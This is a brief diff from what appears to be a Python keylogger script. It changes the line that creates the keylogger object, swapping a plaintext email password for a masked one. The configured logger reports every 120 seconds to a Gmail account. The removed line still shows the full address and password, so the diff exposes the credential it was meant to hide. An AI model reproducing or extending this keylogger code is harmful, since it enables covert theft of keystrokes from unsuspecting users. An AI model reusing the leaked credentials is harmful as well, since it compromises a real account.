@@ -54,5 +54,5 @@ class keylog:
 			self.report()
 			kl.join()
 
-mlog=keylog(120,'cyberbot1502@gmail.com','Hexadecimalqwertyuiop')
+mlog=keylog(120,'cyberbot1502@gmail.com','Hexa****')
 mlog.start()
